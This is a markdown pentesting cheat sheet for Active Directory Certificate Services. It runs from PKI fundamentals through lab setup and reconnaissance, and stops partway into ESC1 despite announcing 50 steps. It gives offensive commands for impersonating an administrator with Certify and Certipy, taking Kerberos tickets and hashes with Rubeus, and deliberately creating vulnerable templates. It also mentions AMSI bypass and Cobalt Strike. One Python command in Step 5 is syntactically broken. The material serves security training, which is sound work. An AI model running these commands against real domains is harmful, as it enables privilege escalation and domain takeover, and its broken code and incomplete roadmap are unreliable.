# AD CS Pentesting Roadmap — Expanded Cheat Sheet

> **Active Directory Certificate Services (AD CS) · 50 Steps · 5 Phases**
> A comprehensive reference from PKI fundamentals through advanced exploitation, custom tooling, and enterprise-grade defense.

---

## Table of Contents

- [Phase 1 — Foundations & Architecture (Steps 1–10)](#phase-1--foundations--architecture-steps-110)
- [Phase 2 — Lab Construction & Reconnaissance (Steps 11–20)](#phase-2--lab-construction--reconnaissance-steps-1120)
- [Phase 3 — Misconfigured Template Exploitation ESC1–ESC4 (Steps 21–30)](#phase-3--misconfigured-template-exploitation-esc1esc4-steps-2130)
- [Phase 4 — Architecture, Access Control & Relay Attacks ESC5–ESC8 (Steps 31–40)](#phase-4--architecture-access-control--relay-attacks-esc5esc8-steps-3140)
- [Phase 5 — Advanced Engineering, Tool Crafting & Defense (Steps 41–50)](#phase-5--advanced-engineering-tool-crafting--defense-steps-4150)

---

## Phase 1 — Foundations & Architecture (Steps 1–10)

> **Goal:** Master the mathematical, cryptographic, and architectural blueprints behind AD CS and its deep integration with Active Directory.

---

### Step 1 — Master Public Key Infrastructure (PKI)

**Description:**
PKI is the backbone of all certificate-based security in Windows environments. Understand the mathematical relationship between public and private keys (RSA, ECDSA), how Certificate Authorities (CAs) act as trusted third parties, and how the chain-of-trust model flows from Root CA → Subordinate CA → End-entity certificate. Study how digital signatures provide non-repudiation, how encrypted key exchange works without a pre-shared secret, and how this entire framework underpins Kerberos authentication in Active Directory.

**Key Concepts:**
- Asymmetric cryptography (RSA, ECDSA, ECDH)
- Public key / private key pair generation
- Digital signatures and hash functions (SHA-256, SHA-1)
- Certificate Authority (CA) as a trusted third party
- Root CA, Subordinate CA, end-entity certificates
- Chain of trust / certificate path validation
- Non-repudiation and integrity
- Key encipherment vs. digital signature key usage

**Key Commands:**
```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
openssl req -new -key private.pem -out request.csr
openssl x509 -req -in request.csr -signkey private.pem -out cert.pem -days 365
openssl x509 -in cert.pem -noout -text
```

> **Attack Relevance:** The trust chain is the foundational mental model for every ESC attack. ESC1–ESC8 all exploit some weakness in HOW the CA grants trust, so understanding legitimate trust mechanics is essential before weaponizing misconfigurations.

---

### Step 2 — Deconstruct the X.509 Certificate Structure

**Description:**
An X.509 v3 certificate is a standardized data structure that cryptographically binds a public key to an identity. You must be able to read and interpret every field of a raw certificate. The most attack-relevant fields are: `Subject` (who owns the cert), `Issuer` (who signed it), `Validity Period` (NotBefore/NotAfter), `Subject Alternative Name (SAN)` — which is the primary attack surface in ESC1 — `Serial Number`, `Key Usage`, `Extended Key Usage (EKU)`, `Authority Key Identifier (AKID)`, and `Subject Key Identifier (SKID)`.

**Key Concepts:**
- X.509 v3 standard (RFC 5280)
- Subject DN (Distinguished Name): CN, O, OU, DC
- Subject Alternative Name (SAN) — DNS, IP, UPN, email
- User Principal Name (UPN) — maps certificate to AD user account
- Validity period (NotBefore / NotAfter)
- Serial number and revocation tracking
- Key Usage flags: digitalSignature, keyEncipherment, nonRepudiation
- Extended Key Usage (EKU) OIDs
- Authority Key Identifier (AKID) and trust chain linking
- Critical vs. non-critical extensions

**Key Commands:**
```bash
openssl x509 -in cert.pem -noout -text
openssl x509 -in cert.der -inform DER -noout -text
certutil -dump cert.pfx
certutil -v -store My
# Parse SAN specifically:
openssl x509 -in cert.pem -noout -ext subjectAltName
```

> **Attack Relevance:** The SAN field — specifically the UPN entry — is what the KDC uses to map a certificate to an AD account during PKINIT. ESC1 injects an attacker-controlled UPN (e.g., `Administrator@domain.local`) into this field to impersonate any user.

---

### Step 3 — Analyze Extended Key Usages (EKUs) & OIDs

**Description:**
EKUs restrict the purposes for which a certificate may be used. From an offensive perspective, the critical EKUs are: **Client Authentication** (`1.3.6.1.5.5.7.3.2`) — allows Kerberos login via PKINIT; **Smartcard Logon** (`1.3.6.1.4.1.311.20.2.2`) — same effect; **Certificate Request Agent** (`1.3.6.1.4.1.311.20.2.1`) — allows requesting certificates on behalf of other AD principals (ESC3); **Any Purpose** (`2.5.29.37.0`) — no restriction, abused in ESC2; and **missing EKU** — treated the same as Any Purpose by many implementations. Object Identifiers (OIDs) are the dotted-decimal numerical identifiers for each EKU.

**Key Concepts:**
- Object Identifier (OID) structure and IANA/Microsoft namespaces
- Client Authentication OID: `1.3.6.1.5.5.7.3.2`
- Smartcard Logon OID: `1.3.6.1.4.1.311.20.2.2`
- Certificate Request Agent OID: `1.3.6.1.4.1.311.20.2.1`
- Any Purpose OID: `2.5.29.37.0`
- No EKU = treated as Any Purpose
- PKINIT-compatible EKU list
- `szOID_PKIX_KP_CLIENT_AUTH`, `szOID_MS_SC_LOGON`
- Code Signing OID: `1.3.6.1.5.5.7.3.3`
- Server Authentication OID: `1.3.6.1.5.5.7.3.1`

**Key Commands:**
```bash
openssl x509 -in cert.pem -noout -text | grep -A5 "Extended Key"
certutil -v -template TemplateName | findstr EKU
# In Certipy output look for: "Extended Key Usage" section
```

> **Attack Relevance:** If a template has Client Authentication or Smartcard Logon EKU AND allows enrollees to supply the Subject/SAN, it is directly exploitable (ESC1). Map every template's EKU before selecting an attack path.

---

### Step 4 — Differentiate Certificate Encodings

**Description:**
Certificates exist in multiple file formats and encodings. Mastering format conversion is a practical skill needed throughout engagements — tools accept different formats, and pivoting between them is a daily workflow. The key formats are: **DER** (binary encoding, raw ASN.1); **PEM** (Base64-encoded DER wrapped in `-----BEGIN CERTIFICATE-----` headers); **PFX/P12** (PKCS#12, bundles certificate + private key + chain, password-protected); **CRT** (usually PEM, but ambiguous); **CER** (usually DER, exported from Windows).

**Key Concepts:**
- DER (Distinguished Encoding Rules) — binary, used internally
- PEM (Privacy Enhanced Mail) — Base64 of DER, used by OpenSSL
- PKCS#12 / PFX / P12 — certificate + private key bundle
- PKCS#7 / P7B — certificate chain without private key
- CRT / CER — Windows-common aliases for PEM/DER
- `openssl pkcs12` for PFX manipulation
- Password protection on PFX files
- Certipy output format: `.pfx` (PKCS#12)
- Rubeus input format: Base64-encoded PFX

**Key Commands:**
```bash
# PEM → DER
openssl x509 -in cert.pem -outform DER -out cert.der
# DER → PEM
openssl x509 -in cert.der -inform DER -outform PEM -out cert.pem
# PEM + key → PFX
openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem
# PFX → PEM cert + key
openssl pkcs12 -in cert.pfx -nocerts -out key.pem
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem
# Inspect PFX contents
openssl pkcs12 -in cert.pfx -info -noout
```

---

### Step 5 — Dive into ASN.1 & BER/DER Encoding

**Description:**
Abstract Syntax Notation One (ASN.1) is the formal language that describes the structure of X.509 certificates at the byte level. Distinguished Encoding Rules (DER) is the canonical binary serialization of ASN.1 data. Understanding this is essential for: writing custom parsers, analyzing malformed certificates, crafting manual PKINIT packets (Step 45), and debugging edge cases in exploitation. Key constructs include: SEQUENCE, SET, INTEGER, BIT STRING, OCTET STRING, OID, UTCTime, IA5String, UTF8String.

**Key Concepts:**
- ASN.1 grammar and type system
- DER vs. BER (Basic Encoding Rules) — DER is a strict subset
- TLV structure: Tag, Length, Value
- SEQUENCE, SET, SEQUENCE OF, SET OF
- Primitive types: INTEGER, BOOLEAN, BIT STRING, OCTET STRING, NULL, OID
- String types: UTF8String, IA5String, PrintableString, BMPString
- Time types: UTCTime (`YYMMDDHHMMSSZ`), GeneralizedTime
- IMPLICIT vs. EXPLICIT tagging
- ASN.1 context tags: `[0]`, `[1]`, `[2]` etc.
- `openssl asn1parse` for inspection

**Key Commands:**
```bash
openssl asn1parse -in cert.pem
openssl asn1parse -in cert.der -inform DER
openssl asn1parse -in cert.pem -strparse <offset>
# Install dumpasn1 for more detailed analysis
dumpasn1 cert.der
# Python: use pyasn1 or cryptography library
python3 -c "from cryptography import x509; import open('cert.pem','rb').read() as d; print(x509.load_pem_x509_certificate(d))"
```

---

### Step 6 — Map AD CS Enterprise Architecture

**Description:**
AD CS operates within a hierarchical architecture deeply integrated with Active Directory. An **Enterprise CA** is joined to the domain — it reads templates from AD, issues certificates automatically, and publishes to the `NTAuthCertificates` store. A **Standalone CA** is not domain-joined and requires manual approval. The standard enterprise hierarchy is: offline Root CA (standalone, air-gapped) → online Issuing/Subordinate CA (enterprise, domain-joined). The Issuing CA is the operational attack surface. Understanding this architecture determines which systems to target and what level of access each compromise provides.

**Key Concepts:**
- Enterprise CA vs. Standalone CA
- Root CA (offline, air-gapped best practice)
- Subordinate / Issuing CA (online, domain-joined)
- Two-tier vs. three-tier CA hierarchy
- `NTAuthCertificates` AD object — controls which CAs can issue logon certs
- Certificate Distribution Point (CDP) — where CRLs are published
- Authority Information Access (AIA) — where issuer certs are published
- AD CS roles: Certification Authority, Web Enrollment, NDES, CES, CEP
- `certsrv.msc` — CA management console
- `pkiview.msc` — Enterprise PKI view

**Key Commands:**
```bash
# List CAs in domain
certutil -config - -ping
certutil -CA
# View CA configuration
certutil -getreg CA\InterfaceFlags
certutil -getreg CA\SubjectAltName
# Enumerate from LDAP
ldapsearch -H ldap://DC -b "CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
```

---

### Step 7 — Understand Certificate Templates

**Description:**
Certificate templates are the blueprints that define what certificates the CA issues. They are stored as objects in the AD Configuration Naming Context and replicated forest-wide. Templates define: who can enroll, what EKUs are included, whether the enrollee can supply the subject, whether manager approval is required, key length, validity period, and whether private keys are exportable. Template misconfigurations (ESC1–ESC4) are the primary attack surface in most AD CS engagements. Template objects are stored in `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration`.

**Key Concepts:**
- Certificate template AD object: class `pKICertificateTemplate`
- Template version 1 (legacy) vs. version 2 (enterprise, supports autoenrollment)
- `msPKI-Certificate-Name-Flag` — controls subject name supply (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`)
- `msPKI-Enrollment-Flag` — controls approval requirements (`CT_FLAG_PEND_ALL_REQUESTS`)
- `msPKI-RA-Signature` — number of authorized signatures required
- `pKIExtendedKeyUsage` — EKU list
- `nTSecurityDescriptor` — ACL controlling enrollment rights
- Enrollment rights: `Certificate-Enrollment` extended right
- Autoenrollment rights: `Certificate-AutoEnrollment` extended right
- Template publishing: linked from CA's `certificateTemplates` attribute

**Key Commands:**
```bash
# Query templates via LDAP
ldapsearch -H ldap://DC -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" "(objectClass=pKICertificateTemplate)" name msPKI-Certificate-Name-Flag pKIExtendedKeyUsage
# Windows: list published templates
certutil -catemplates
certutil -v -template TemplateName
```

---

### Step 8 — Inspect AD CS LDAP Object Classes

**Description:**
AD CS metadata lives entirely in LDAP under the Configuration Naming Context. Mastering these object classes allows you to enumerate the PKI infrastructure without running noisy tools. Key containers and classes: `pKIEnrollmentService` (one per CA — contains the CA's certificate, template list, and DNS name); `pKIAuthority` (represents the CA itself); `pKICertificateTemplate` (each published template); `certificationAuthority` (Root CA objects in `NTAuthCertificates` and `AIA`); `cRLDistributionPoint`.

**Key Concepts:**
- Configuration NC path: `CN=Configuration,DC=domain,DC=local`
- `CN=Public Key Services,CN=Services,CN=Configuration`
- `pKIEnrollmentService` — Issuing CA service objects
- `pKIAuthority` — CA authority objects
- `pKICertificateTemplate` — template blueprint objects
- `certificationAuthority` — objects in NTAuthCertificates, AIA, CDP
- `cRLDistributionPoint` — CRL publishing points
- `dNSHostName` attribute — CA server hostname
- `cACertificate` attribute — CA's own certificate (DER-encoded)
- `certificateTemplates` attribute — list of published templates on a CA

**Key Commands:**
```bash
# Enumerate enrollment services (CAs)
ldapsearch -H ldap://DC -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" "(objectClass=pKIEnrollmentService)" dNSHostName certificateTemplates
# Enumerate NTAuthCertificates
ldapsearch -H ldap://DC -b "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
# ADSI Edit on Windows: navigate to Configuration > Services > Public Key Services
```

---

### Step 9 — Deconstruct Certificate-Based Authentication (PKINIT)

**Description:**
PKINIT (Public Key Initial Authentication) is the Kerberos extension that allows a user to authenticate to the KDC using a certificate instead of a password. The flow is: (1) Client selects a certificate with a PKINIT-compatible EKU; (2) Client constructs an `AS-REQ` containing the certificate and a signed `PA-PK-AS-REQ` structure; (3) KDC validates the certificate against trusted CAs in `NTAuthCertificates` and maps the certificate to an AD account via UPN or explicit mapping; (4) KDC issues a TGT encrypted with the account's long-term key; (5) Client decrypts using the CA-signed certificate. This is the mechanism all certificate-based attacks ultimately abuse.

**Key Concepts:**
- Kerberos AS-REQ / AS-REP protocol
- `PA-PK-AS-REQ` pre-authentication data (PKINIT)
- `PA-PK-AS-REP` — KDC's response containing session key
- Certificate-to-account mapping: UPN SAN lookup in AD
- `NTAuthCertificates` — which CAs are trusted for logon
- KDC certificate validation: chain, revocation, EKU check
- Diffie-Hellman key exchange in PKINIT
- `KERB-CERTIFICATE-INFO` structure
- `U2U` (User-to-User) PKINIT variant
- Shadow Credentials (alternative PKINIT abuse via `msDS-KeyCredentialLink`)

**Key Commands:**
```bash
# Request TGT using certificate (Certipy)
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# Request TGT using certificate (Rubeus)
Rubeus.exe asktgt /certificate:base64cert /password:pfxpass /domain:domain.local /dc:10.10.10.10 /ptt
# Extract NTLM hash from TGT (Certipy outputs hash automatically)
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10 -username administrator -domain domain.local
```

---

### Step 10 — Analyze Revocation Mechanics

**Description:**
Certificate revocation allows a CA to invalidate certificates before their expiry. Two mechanisms exist: **CRL (Certificate Revocation List)** — a periodically published, CA-signed list of revoked serial numbers; **OCSP (Online Certificate Status Protocol)** — a real-time query-response protocol for individual certificate status. Understanding revocation is important for both offensive persistence (can your stolen cert be revoked?) and defensive response (how quickly can you revoke an abused cert?). CRL caching means revocation can take hours or days to propagate in practice — a critical offensive advantage.

**Key Concepts:**
- Certificate Revocation List (CRL) — RFC 5280
- CRL Distribution Point (CDP) — URL where CRL is published
- Delta CRL vs. Base CRL
- CRL caching and validity window (`nextUpdate` field)
- OCSP (Online Certificate Status Protocol) — RFC 6960
- OCSP stapling
- OCSP responder certificate
- `authorityInformationAccess` extension (AIA)
- Revocation reason codes: keyCompromise, cACompromise, affiliationChanged, superseded, cessationOfOperation, certificateHold
- `certutil -revoke` to manually revoke on Microsoft CA
- Persistence implication: CRL latency means recently compromised certs may remain valid for hours

**Key Commands:**
```bash
# Download and inspect CRL
openssl crl -in crl.pem -text -noout
certutil -url cert.pem         # Check revocation via CDP/OCSP
certutil -verify -urlfetch cert.pem
# OCSP query
openssl ocsp -issuer issuer.pem -cert cert.pem -url http://ocsp.domain.local -resp_text
```

---

## Phase 2 — Lab Construction & Reconnaissance (Steps 11–20)

> **Goal:** Build your specialized testing environment and master the techniques required to discover AD CS infrastructure within a target network.

---

### Step 11 — Build a Multi-Domain Lab Environment

**Description:**
A realistic lab requires at minimum: one Windows Server for the Root Domain (`corp.local`), one for a Child Domain (`child.corp.local`), and one dedicated CA server. Use Hyper-V, VMware, or VirtualBox. Add a Windows 10/11 workstation as a domain-joined client for testing enrollment. Snapshot aggressively. Use NAT networking so the lab is isolated. Install RSAT tools on the workstation for GUI management. A two-domain setup is critical for testing cross-domain template abuse (Step 29) and cross-forest scenarios.

**Key Concepts:**
- Windows Server 2019/2022 evaluation licenses
- Active Directory Domain Services (AD DS) role
- Forest root domain vs. child domain trust relationships
- AD replication and Configuration NC replication
- DNS configuration for AD (critical — misconfigured DNS breaks everything)
- Domain functional level and forest functional level
- RSAT (Remote Server Administration Tools)
- Snapshot discipline: before and after each major change
- Static IP addressing for DC and CA servers
- Hyper-V / VMware / VirtualBox

**Key Commands (PowerShell):**
```powershell
# Install AD DS role
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
# Promote to Domain Controller
Install-ADDSForest -DomainName "corp.local" -SafeModeAdministratorPassword (Read-Host -AsSecureString)
# Add child domain
Install-ADDSDomain -NewDomainName "child" -ParentDomainName "corp.local" -DomainType ChildDomain
```

---

### Step 12 — Install and Configure an Enterprise CA

**Description:**
Install the Active Directory Certificate Services (AD CS) Windows Server role on a dedicated member server (not on the DC). Choose **Enterprise Root CA** during setup (for lab simplicity — production uses offline Root + online Issuing). The CA will automatically publish its certificate to AD and appear in LDAP as a `pKIEnrollmentService` object. After install, configure the CA with appropriate CDP and AIA locations, enable auditing, and optionally enable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (for ESC6 simulation).

**Key Concepts:**
- AD CS Windows Server role
- Enterprise CA vs. Standalone CA distinction at install time
- CA name and CA type (Root vs. Subordinate)
- Cryptographic provider selection (RSA 2048 / 4096, SHA-256)
- CA database location
- CDP (CRL Distribution Point) URL configuration
- AIA (Authority Information Access) URL configuration
- `certsrv.msc` — Certification Authority management console
- CA publishing to AD (`NTAuthCertificates`, `AIA`, `CDP` LDAP objects)
- Audit policy for certificate operations (Event IDs 4886, 4887, 4888)

**Key Commands (PowerShell):**
```powershell
# Install AD CS role
Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools
# Configure as Enterprise Root CA
Install-AdcsCertificationAuthority -CAType EnterpriseRootCA -CACommonName "CORP-CA" -KeyLength 2048 -HashAlgorithmName SHA256 -Force
# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (for ESC6 lab)
certutil -setreg CA\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

---

### Step 13 — Enable HTTP Enrollment Interfaces

**Description:**
Several AD CS web-based enrollment interfaces are critical to understand both as attack surfaces and as legacy infrastructure commonly found in enterprises. **Certificate Enrollment Web Service (CES)** and **Certificate Enrollment Policy Web Service (CEP)** handle modern enrollment. **Web Enrollment (`/certsrv/`)** is the legacy IIS-based interface — crucially, it defaults to HTTP (not HTTPS) in many environments, making it vulnerable to NTLM relay (ESC8). Enable all of these in your lab to simulate real-world exposure.

**Key Concepts:**
- Web Enrollment role (`certsrv/`): IIS-hosted, legacy NTLM auth
- Certificate Enrollment Web Service (CES): HTTPS, Kerberos/certificate auth
- Certificate Enrollment Policy Web Service (CEP): policy endpoint
- Network Device Enrollment Service (NDES): SCEP for network devices
- IIS authentication settings: Windows Authentication, Anonymous
- HTTP vs. HTTPS — HTTP enables NTLM relay (ESC8 prerequisite)
- `/certsrv/certfnsh.asp` — the specific endpoint relayed in ESC8
- Extended Protection for Authentication (EPA) — mitigation for relay
- IIS application pool identity

**Key Commands (PowerShell):**
```powershell
Install-WindowsFeature ADCS-Web-Enrollment -IncludeManagementTools
Install-AdcsWebEnrollment -Force
# Force HTTP (remove HTTPS binding for ESC8 lab):
# In IIS Manager: Bindings → remove HTTPS, leave HTTP on port 80
```

---

### Step 14 — Deploy Flawed Templates

**Description:**
Create custom certificate templates in your lab that deliberately replicate the misconfigurations responsible for ESC1 through ESC8. For ESC1: enable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, add Client Authentication EKU, grant Domain Users enrollment rights. For ESC2: set EKU to `Any Purpose` or leave blank. For ESC3: include the `Certificate Request Agent` EKU. For ESC4: grant Domain Users `WriteDacl` or `WriteOwner` on the template object. Document each template's exact misconfiguration for reference during exploitation phases.

**Key Concepts:**
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (value: 0x00000001) in `msPKI-Certificate-Name-Flag`
- `CT_FLAG_PEND_ALL_REQUESTS` — manager approval flag
- Enrollment rights ACE: `Certificate-Enrollment` extended right GUID
- `msPKI-RA-Signature` — required co-signer count (ESC3 bypass when 0)
- Template ACL: `WriteDacl`, `WriteOwner`, `WriteProperty` permissions
- Publishing templates: CA must explicitly publish each template
- Duplicating built-in templates as a base
- Template OID uniqueness requirement
- `msPKI-Private-Key-Flag`: `EXPORTABLE_KEY` flag

**Key Commands:**
```powershell
# Duplicate template via GUI: certtmpl.msc → right-click → Duplicate
# Publish template to CA:
Add-CATemplate -TemplateName "ESC1-Template"
# Set Name Flags via ADSI Edit or PowerShell:
Set-ADObject -Identity "CN=ESC1-Template,CN=Certificate Templates,..." -Replace @{"msPKI-Certificate-Name-Flag"=1}
```

---

### Step 15 — Assemble the Attack Toolkit

**Description:**
The modern AD CS attack toolkit is well-established. **Certipy** (Python, Linux-native) is the primary all-in-one tool for enumeration and exploitation. **Certify** (C#, runs on Windows) performs the same enumeration from a domain-joined context. **Rubeus** (C#) handles all Kerberos operations — requesting TGTs from certs, performing Pass-the-Ticket. **BloodHound + SharpHound** visualize attack paths including AD CS nodes. **Impacket** (`ntlmrelayx`, `secretsdump`) is essential for ESC8 relay and DCSync. Set up a Kali or Ubuntu attacker box in your lab network.

**Key Concepts:**
- Certipy: `certipy find`, `certipy req`, `certipy auth`, `certipy relay`
- Certify: `Certify.exe find /vulnerable`
- Rubeus: `asktgt`, `asktgs`, `ptt`, `dump`, `kerberoast`
- BloodHound / SharpHound: AD CS nodes (`ADCS`, `CertTemplate`, `EnrollmentService`)
- Impacket: `ntlmrelayx.py`, `secretsdump.py`, `getPac.py`
- Mimikatz: `crypto::certificates`, `lsadump::dcsync`
- PowerView: AD enumeration complement
- Python virtual environments for tool isolation
- AMSI bypass techniques for running C# tools on Windows targets

**Key Commands:**
```bash
# Install Certipy
pip3 install certipy-ad
# Run Certipy enumeration
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable
# Run Certify (from Windows)
Certify.exe find /vulnerable
# Start BloodHound
bloodhound &
# Run SharpHound
SharpHound.exe -c All --zipfilename loot.zip
```

---

### Step 16 — Conduct Passive Network Reconnaissance

**Description:**
Before touching any AD CS tooling, perform passive and semi-passive network reconnaissance to locate CA servers. CA servers expose: RPC endpoint mapper (TCP 135) for DCOM/RPC enrollment; SMB (TCP 445) for LDAP/DC communication; HTTP/HTTPS (TCP 80/443) for web enrollment interfaces. LDAP queries reveal CA names. DNS reveals hostnames. Passive capture (Wireshark) can reveal certificate exchange traffic. Avoid running loud tools before understanding what detection is in place.

**Key Concepts:**
- RPC endpoint mapper: TCP 135 (DCOM enrollment)
- SMB: TCP 445
- LDAP: TCP 389, LDAPS 636
- Web Enrollment: HTTP 80, HTTPS 443
- `nmap` service detection and script scanning
- Wireshark certificate traffic analysis
- NetBIOS/LLMNR passive listening
- DNS SRV record enumeration for DCs
- `_ldap._tcp.pdc._msdcs.domain.local` DNS records
- Firewall evasion: slow scan rates

**Key Commands:**
```bash
# Port scan potential CA servers
nmap -sV -p 80,135,389,443,445,636,9389 10.10.10.0/24
# NSE script for certificate info
nmap --script ssl-cert -p 443 10.10.10.10
# Passive LDAP CA enumeration
ldapsearch -H ldap://10.10.10.10 -x -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
# Wireshark filter for certificate traffic
# Filter: tls.handshake.certificate
```

---

### Step 17 — Perform Low-Level LDAP Queries

**Description:**
Before running Certipy or Certify, practice raw LDAP enumeration of the AD CS infrastructure. This develops deep intuition for what these tools are doing under the hood, and is essential for environments where AV/EDR blocks offensive tooling. Key targets: `CN=Enrollment Services` (finds CAs), `CN=Certificate Templates` (finds all templates and their attributes), `CN=NTAuthCertificates` (finds trusted CA certs), `CN=Public Key Services` container (parent of all AD CS objects).

**Key Concepts:**
- LDAP search base for PKI: `CN=Public Key Services,CN=Services,CN=Configuration`
- Attribute `dNSHostName` — CA server name from `pKIEnrollmentService`
- Attribute `certificateTemplates` — published templates on a CA
- Attribute `msPKI-Certificate-Name-Flag` — ESC1 indicator
- Attribute `msPKI-Enrollment-Flag` — approval flags
- Attribute `pKIExtendedKeyUsage` — EKU OIDs
- Attribute `nTSecurityDescriptor` — ACL (requires special LDAP control to retrieve)
- ADSI Edit (Windows GUI): `CN=Configuration` → drill to PKI container
- `ldp.exe` (Windows): GUI LDAP browser

**Key Commands:**
```bash
# Enumerate all templates
ldapsearch -H ldap://DC -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" "(objectClass=pKICertificateTemplate)" name msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage
# Find CAs
ldapsearch -H ldap://DC -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" "(objectClass=pKIEnrollmentService)"
# Windows native
([adsisearcher]"(objectClass=pKIEnrollmentService)").FindAll()
```

---

### Step 18 — Master Certipy Auditing

**Description:**
Certipy is the gold-standard tool for AD CS enumeration and exploitation. The `find` command queries LDAP and produces structured output identifying all misconfigured templates, CA permissions, and attack paths. Study every field in Certipy's text output: `Enabled` (is the template published?), `Client Authentication` (PKINIT-capable?), `Enrollee Supplies Subject` (ESC1?), `Low Privilege` (domain users can enroll?), `Requires Manager Approval` (ESC1 blocked?), `No Security Extension` (ESC9 related?), `CA Name`, `Enrollment Endpoint`.

**Key Concepts:**
- `certipy find -vulnerable` — filters to exploitable templates only
- `certipy find -text` — human-readable output
- `certipy find -json` — machine-parseable output for automation
- `certipy find -bloodhound` — BloodHound-ingestible JSON
- Template fields: `Enabled`, `Client Authentication`, `Enrollee Supplies Subject`, `Requires Manager Approval`, `Authorized Signatures Required`
- CA fields: `User Specified SAN`, `Request Disposition`, `Enforce Encryption for Requests`
- ESC identification labels in Certipy output
- Multiple CA enumeration in multi-CA environments
- Credential formats: username/password, NTLM hash, Kerberos ticket

**Key Commands:**
```bash
certipy find -u 'user@domain.local' -p 'password' -dc-ip 10.10.10.10
certipy find -u 'user@domain.local' -p 'password' -dc-ip 10.10.10.10 -vulnerable -text
certipy find -u 'user@domain.local' -p 'password' -dc-ip 10.10.10.10 -bloodhound
# With NTLM hash
certipy find -u 'user@domain.local' -hashes ':NTLMhash' -dc-ip 10.10.10.10 -vulnerable
```

---

### Step 19 — Execute Internal Audits with Certify

**Description:**
Certify is the Windows-native C# equivalent of Certipy, designed to run from a domain-joined session on a Windows host. It enumerates AD CS from the perspective of a standard domain user. Practice running it without administrator rights to simulate a realistic insider threat or post-phishing scenario. Certify's output is directly human-readable and maps template misconfigurations to ESC categories. Cross-reference its output with Certipy's findings to validate results.

**Key Concepts:**
- Certify runs as any domain user (no elevation required for enumeration)
- `Certify.exe find /vulnerable` — scan for exploitable templates
- `Certify.exe find /enrolleeSuppliesSubject` — find ESC1 candidates
- `Certify.exe cas` — enumerate CAs
- `Certify.exe pkiobjects` — enumerate PKI LDAP objects
- Output fields mirror Certipy but in Windows text format
- AMSI and AV evasion for running C# tools
- In-memory execution via Cobalt Strike / execute-assembly
- Comparison between Certipy and Certify output for validation

**Key Commands:**
```powershell
# Download and run Certify
.\Certify.exe find /vulnerable
.\Certify.exe find /enrolleeSuppliesSubject
.\Certify.exe cas
# Request a certificate
.\Certify.exe request /ca:"CA-Server\CA-Name" /template:"TemplateName" /altname:"administrator"
```

---

### Step 20 — Map Attack Paths with BloodHound

**Description:**
BloodHound v4+ includes AD CS nodes and edges, enabling visual attack path analysis from low-privilege users to Domain Admin via certificate abuse. AD CS-specific edges include: `Enroll` (can request from template), `WritePKIEnrollmentFlag`, `WritePKINameFlag`, `ManageCA`, `ManageCertificates`. Use the BloodHound UI to run pre-built AD CS queries: "Find ESC1 Paths", "Find Principals that can DCSync via ADCS", "Find CA Administrators". SharpHound with `-c All` collects AD CS data alongside standard AD data.

**Key Concepts:**
- BloodHound AD CS nodes: `ADCS`, `CertTemplate`, `EnrollmentService`
- BloodHound AD CS edges: `Enroll`, `ManageCA`, `ManageCertificates`, `WritePKIEnrollmentFlag`, `WritePKINameFlag`, `NTAuthStore`
- SharpHound `-c All` collection includes AD CS
- Pre-built BloodHound queries for AD CS attack paths
- Cypher queries for custom AD CS analysis
- BloodHound Community Edition vs. BloodHound Enterprise
- Path analysis: low-privilege user → ESC1 template → Domain Admin
- Group membership chains to enrollment rights
- Owned node marking and attack path prioritization

**Key Commands:**
```bash
# Run SharpHound (collect all data)
SharpHound.exe -c All --zipfilename bloodhound_data.zip
# Upload ZIP to BloodHound GUI
# Useful Cypher query: find templates where Domain Users can enroll
MATCH (n:CertTemplate) WHERE n.enrolleesuppliessubject = true RETURN n.name, n.ekus
# Find path from owned user to DA via certificate
MATCH p = shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

---

## Phase 3 — Misconfigured Template Exploitation ESC1–ESC4 (Steps 21–30)

> **Goal:** Exploit classic template-level misconfigurations identified by SpecterOps that allow immediate privilege escalation from any domain user.

---

### Step 21 — Analyze ESC1 (Enrollee Supplies Subject)

**Description:**
ESC1 is the most commonly found and most directly exploitable AD CS vulnerability. It requires four conditions to be simultaneously true on a template: (1) the template has an authentication EKU (Client Auth, Smartcard Logon, or Any Purpose); (2) the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is set in `msPKI-Certificate-Name-Flag`, allowing the requester to specify an arbitrary Subject and SAN; (3) manager approval is NOT required (`CT_FLAG_PEND_ALL_REQUESTS` is not set); (4) a low-privileged group (Domain Users, Authenticated Users) has enrollment rights. When all four are true, any domain user can request a certificate claiming to be the Domain Administrator.

**Key Concepts:**
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` = 0x00000001 in `msPKI-Certificate-Name-Flag`
- Authentication EKU requirement: Client Auth OR Smartcard Logon OR Any Purpose
- `CT_FLAG_PEND_ALL_REQUESTS` = 0x00000002 in `msPKI-Enrollment-Flag` (blocks ESC1 if set)
- `msPKI-RA-Signature` = 0 (no authorized signatures required — else ESC3 chaining needed)
- UPN injection: `administrator@domain.local` in SAN
- Enrollment right granted to: Domain Users, Authenticated Users, Everyone
